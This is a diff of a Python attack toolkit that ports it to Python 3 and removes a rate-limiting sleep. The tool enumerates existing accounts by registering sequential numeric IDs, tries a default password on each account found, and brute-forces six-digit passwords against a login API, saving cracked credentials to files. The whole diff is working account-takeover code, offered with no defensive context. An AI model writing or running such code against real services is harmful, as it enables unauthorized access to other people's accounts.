@@ -38,16 +38,16 @@ class EAW_ToolKit:
         existingFile = open('existing.txt','r')
         targetAccountsFile= open('target.txt', 'a')
         accountLines=existingFile.readlines()
-        print accountLines
+        print (accountLines)
         for line in accountLines:
             account = line.strip()
-            response=self.login(account, defaultPassword)
+            response=self._login(account, defaultPassword)
             contentJson=response.json()
-            print 'Login response:' + account, contentJson['code'], contentJson['message']
+            print ('Login response:' + account, contentJson['code'], contentJson['message'])
             if contentJson['code'] == 0:
-                print 'Login default password succeeded for '+ account
+                print ('Login default password succeeded for '+ account)
             else:
-                print 'Saving account whose password is not default:'+ account
+                print ('Saving account whose password is not default:'+ account)
                 targetAccountsFile.write(account)
                 targetAccountsFile.write('\n')
 
@@ -61,19 +61,19 @@ class EAW_ToolKit:
         existing_file=open('existing.txt','a')
         while init_number < maximum:
             account=str(init_number)
-            print 'Regesting account:'+ account
+            print ('Regesting account:'+ account)
             init_number += 1
-            response = self.register(account, password)
+            response = self._register(account, password)
             contentJson = response.json()
-            print contentJson['code'], contentJson['message']
+            print (contentJson['code'], contentJson['message'])
             if contentJson['code'] == 0:
-                print 'Register account succeeded:' + account
+                print ('Register account succeeded:' + account)
             else: 
-                print 'Save existing account:' + account
+                print ('Save existing account:' + account)
                 existing_account.append(account)
                 existing_file.write(account)
                 existing_file.write("\n")
-            time.sleep(0.1)
+            # time.sleep(0.1)
 
 
     # brute force try password 6 digits password 100000 - 999999
@@ -83,21 +83,21 @@ class EAW_ToolKit:
         targetPwdFile= open('target-pwd.txt', 'a')
         while start < maximum:
             password = str(start)
-            response = self.login(account, password)
+            response = self._login(account, password)
             try:
                 contentJson = response.json()
             except ValueError:
-                print 'Failed to pass JSON:'+ account+':'+password, response.content
+                print ('Failed to pass JSON:'+ account+':'+password, response.content)
                 continue
             
-            print 'Login response:' + account+':'+password, contentJson['code'], contentJson['message']
+            print ('Login response:' + account+':'+password, contentJson['code'], contentJson['message'])
             if contentJson['code'] == 0 :
-                print 'Password succeeded:'+ password
+                print ('Password succeeded:'+ password)
                 targetPwdFile.write(account+':'+password)
                 targetPwdFile.write('\n')
             # time.sleep(0.01)
             start += 1
-        print 'No password found'
+        print ('No password found')
 
 
     
